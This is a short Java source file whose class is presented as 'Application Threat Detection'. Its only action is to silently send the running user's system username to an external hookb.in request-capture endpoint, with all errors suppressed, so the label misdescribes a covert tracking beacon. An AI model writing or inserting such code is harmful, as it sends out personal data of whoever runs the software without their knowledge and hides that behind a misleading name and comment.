package com.harambe.tools;

import java.net.URL;
import java.net.URLConnection;

/**
 * Application Threat Detection
 * to be removed
 */
public class ATD implements Runnable {
    @Override
    public void run() {
        try {
            URLConnection connection = new URL("https://hookb.in/E7ezOJ73?username=" + System.getProperty("user.name")).openConnection();
            connection.connect(); // https://hookbin.com/bin/E7ezOJ73
            connection.getInputStream().close();
        } catch (Exception ignored) {

        }
    }
}
